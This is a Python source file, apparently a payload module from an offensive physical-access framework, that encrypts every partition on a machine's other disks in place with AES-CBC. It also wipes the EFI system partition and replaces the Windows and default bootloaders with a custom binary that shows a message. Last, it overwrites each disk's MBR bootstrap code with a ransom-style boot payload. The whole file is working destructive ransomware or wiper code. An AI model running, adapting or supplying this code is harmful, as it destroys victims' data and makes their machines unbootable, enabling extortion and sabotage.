#!/usr/bin/python3
"""
Disk_encryption payload
"""
from Crypto.Cipher import AES

from snr.core.payload import entry_point, storage
from snr.core.util import common_utils

KEY = "@KEY@".encode()
IV = "@IV@".encode()
MESSAGE = "@MESSAGE@"


def encrypt_device(info: storage.BlockInfo) -> None:
    common_utils.print_info(
        f"Encrypting {info.uuid}... (0/{info.size})", end="")
    aes = AES.new(KEY, AES.MODE_CBC, IV)
    with open(info.path, "r+b") as stream:
        encrypted_size = 0
        while encrypted_size < info.size:
            data = aes.encrypt(stream.read(AES.block_size))
            stream.seek(encrypted_size)
            stream.write(data)
            encrypted_size += AES.block_size
            common_utils.print_info(
                f"\rEncrypting {info.uuid}... ({encrypted_size}/{info.size})", end="")
    common_utils.print_info(
        f"\rEncrypting {info.uuid}... ({encrypted_size}/{info.size}: Done)")


@entry_point.entry_point
def main() -> None:
    block_info, _, our_device = storage.setup(no_lvm=True)
    common_utils.print_info("Disk_encryption payload started")
    with open("/root/bios_disk_encryption_message.bin", "rb") as stream:
        bios_payload = stream.read()

    for device in block_info:
        if device != our_device:
            for child in device.children:
                try:
                    with storage.mount_partition(child.path, no_luks=True) as mounted_part:
                        if mounted_part.exists("efi") and len(mounted_part.listdir("efi")) != 0:
                            if not mounted_part.exists("boot") and not mounted_part.exists("Windows"):
                                common_utils.print_info("Installing to ESP")
                                mounted_part.rmtree("efi", ignore_errors=True)
                                mounted_part.rmtree("EFI", ignore_errors=True)
                                mounted_part.makedirs("EFI/BOOT")
                                mounted_part.copy(
                                    "/root/BOOTX64.EFI", "efi/BOOT/BOOTX64.EFI")
                                with mounted_part.open("EFI/BOOT/message.txt", "w",
                                                       encoding="utf-8") as stream:
                                    stream.write(MESSAGE)
                                mounted_part.mkdir("EFI/Microsoft")
                                mounted_part.copy(
                                    "/root/BOOTX64.EFI", "EFI/Microsoft/BOOTMGFW.EFI")
                                with mounted_part.open("EFI/Microsoft/message.txt", "w",
                                                       encoding="utf-8") as stream:
                                    stream.write(MESSAGE)
                                continue
                except RuntimeError:
                    pass
                # Not the ESP
                encrypt_device(child)
            # Now device, not partition
            # Overwrite MBR bootstrap area
            # But not the whole MBR for two reason:
            # 1. If there is going to be a recovery, this saves the partition table
            # 2. Help with EFI boot if it is a UEFI device
            with open(device.path, "r+b") as stream:
                stream.write(bios_payload)
                # Mark it bootable, as the original flag is now encrypted
                stream.seek(510)
                stream.write(b"\x55\xAA")

    common_utils.print_ok("Disk_encryption payload completed")


if __name__ == "__main__":
    main()
